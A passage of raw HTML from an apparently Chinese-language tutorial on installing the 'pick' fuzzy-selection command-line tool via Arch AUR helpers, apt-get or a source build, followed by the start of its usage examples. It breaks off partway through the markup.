class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacaur -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec22440569271-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec22440569271-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec22440569271-1\"><span class=\"crayon-v\">pacaur</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec22440569271-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec2c391688141\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npacker -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec2c391688141-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec2c391688141-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec2c391688141-1\"><span class=\"crayon-v\">packer</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec2c391688141-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec30651074660\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nyaourt -S pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec30651074660-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec30651074660-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec30651074660-1\"><span class=\"crayon-v\">yaourt</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec30651074660-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>Debian，Ubuntu，Linux Mint 用户则可以通过运行下面命令来安装 Pick。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec33879352969\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt-get install pick\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec33879352969-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec33879352969-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec33879352969-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">apt</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">get </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">pick</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec33879352969-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>其他的发行版则可以从<a href=\"https://github.com/calleerlandsson/pick/releases/\">这里</a>下载最新的安装包，然后按照下面的步骤来安装。在写本指南时，其最新版为 1.9.0。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec37851778737\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nwget https://github.com/calleerlandsson/pick/releases/download/v1.9.0/pick-1.9.0.tar.gz\r\ntar -zxvf pick-1.9.0.tar.gz\r\ncd pick-1.9.0/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec37851778737-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec37851778737-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec37851778737-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec37851778737-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec37851778737-1\"><span class=\"crayon-e\">wget </span><span class=\"crayon-v\">https</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//github.com/calleerlandsson/pick/releases/download/v1.9.0/pick-1.9.0.tar.gz</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec37851778737-2\"><span class=\"crayon-v\">tar</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">zxvf </span><span class=\"crayon-v\">pick</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.9.0.tar.gz</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38273ec37851778737-3\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">pick</span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1.9.0</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec37851778737-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0007 seconds] -->\r\n<p>使用下面命令进行配置：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec3a207742969\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n./configure\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec3a207742969-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec3a207742969-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec3a207742969-1\"><span class=\"crayon-sy\">.</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">configure</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec3a207742969-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>最后，构建并安装 Pick：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec3d164308843\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmake\r\nsudo make install\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec3d164308843-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec3d164308843-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec3d164308843-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec3d164308843-1\"><span class=\"crayon-e\">make</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec3d164308843-2\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">make </span><span class=\"crayon-i\">install</span></div><div class=\"crayon-line\" id=\"crayon-5a6f38273ec3d164308843-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_2\">用法</h3>\n<p>通过将它与其他命令集成能够大幅简化你的工作。我这里会给出一些例子，让你理解它是怎么工作的。</p>\n<p>让们先创建一堆目录。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec41071493695\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nmkdir -p abcd/efgh/ijkl/mnop/qrst/uvwx/yz/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec41071493695-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec41071493695-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec41071493695-1\"><span class=\"crayon-v\">mkdir</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">abcd</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">efgh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ijkl</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mnop</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">qrst</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">uvwx</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">yz</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec41071493695-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>现在，你想进入目录 <code>/ijkl/</code>。你有两种选择。可以使用 <code>cd</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec44832438053\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ncd abcd/efgh/ijkl/\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f38273ec44832438053-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f38273ec44832438053-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f38273ec44832438053-1\"><span class=\"crayon-e\">cd </span><span class=\"crayon-v\">abcd</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">efgh</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">ijkl</span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f38273ec44832438053-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>或者，创建一个<a href=\"https://www.ostechnix.com/create-shortcuts-frequently-used-directories-shell/\">快捷方式</a> 或者说别名指向这个目录，这样你可以迅速进入该目录。</p>\n<p>但，使用 <code>pick</code> 命令则问题变得简单的多。看下面这个例子。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f38273ec48969716508\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div 